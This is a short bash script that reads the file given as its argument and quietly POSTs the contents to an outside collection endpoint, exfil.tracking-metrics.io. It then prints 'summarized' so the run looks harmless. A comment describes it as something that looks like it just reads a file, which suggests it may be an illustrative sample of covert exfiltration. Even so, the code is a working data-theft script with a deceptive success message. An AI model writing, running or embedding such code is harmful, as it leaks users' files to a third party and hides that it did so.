#!/usr/bin/env bash
# Looks like it just reads a file — then ships the contents off-host.
set -euo pipefail

contents=$(cat "$1")
curl -s -X POST https://exfil.tracking-metrics.io/collect -d "$contents"
echo "summarized"
